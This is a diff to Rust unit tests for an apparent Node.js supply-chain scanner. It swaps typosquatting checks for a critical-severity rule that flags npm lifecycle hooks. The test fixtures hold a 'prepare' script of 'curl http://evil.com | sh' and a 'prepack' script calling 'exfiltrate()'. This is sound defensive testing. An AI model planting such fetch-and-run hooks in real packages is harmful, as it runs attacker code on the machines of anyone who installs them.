@@ -18,43 +18,43 @@ fn snapshot(content: &str) -> RepoSnapshot {
 fn ruleset() -> Arc<RuleSet> {
     Arc::new(RuleSet {
         rules: vec![Rule {
-            id: RuleId::parse("NODE-006").unwrap(),
-            name: "Typosquatting risk".to_owned(),
+            id: RuleId::parse("NODE-011").unwrap(),
+            name: "Expanded lifecycle hooks".to_owned(),
             description: String::new(),
-            severity: Severity::Medium,
+            severity: Severity::Critical,
             language: Language::NodeJs,
-            pattern: Pattern::TypoSquat {
-                known_packages: vec!["express".to_owned(), "lodash".to_owned()],
+            pattern: Pattern::ScriptKey {
+                keys: vec![
+                    "postinstall".to_owned(),
+                    "preinstall".to_owned(),
+                    "prepare".to_owned(),
+                    "install".to_owned(),
+                    "prepack".to_owned(),
+                    "postpack".to_owned(),
+                ],
             },
         }],
     })
 }
 
 #[test]
-fn detects_express_typo_in_dependencies() {
-    let pkg = r#"{"dependencies": {"expres": "^4.0.0"}}"#;
+fn detects_prepare_hook() {
+    let pkg = r#"{"scripts": {"prepare": "curl http://evil.com | sh"}}"#;
     let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
     assert_eq!(findings.len(), 1);
-    assert!(findings[0].message.contains("expres"));
+    assert!(findings[0].message.contains("prepare"));
 }
 
 #[test]
-fn detects_lodash_typo_in_dev_dependencies() {
-    let pkg = r#"{"devDependencies": {"lodahs": "^4.0.0"}}"#;
+fn detects_prepack_hook() {
+    let pkg = r#"{"scripts": {"prepack": "exfiltrate()"}}"#;
     let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
     assert_eq!(findings.len(), 1);
 }
 
 #[test]
-fn ignores_exact_package_names() {
-    let pkg = r#"{"dependencies": {"express": "^4.0.0", "lodash": "^4.0.0"}}"#;
-    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
-    assert!(findings.is_empty());
-}
-
-#[test]
-fn ignores_clearly_unrelated_names() {
-    let pkg = r#"{"dependencies": {"completely-different-name": "^1.0.0"}}"#;
+fn ignores_safe_scripts() {
+    let pkg = r#"{"scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."}}"#;
     let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
     assert!(findings.is_empty());
 }
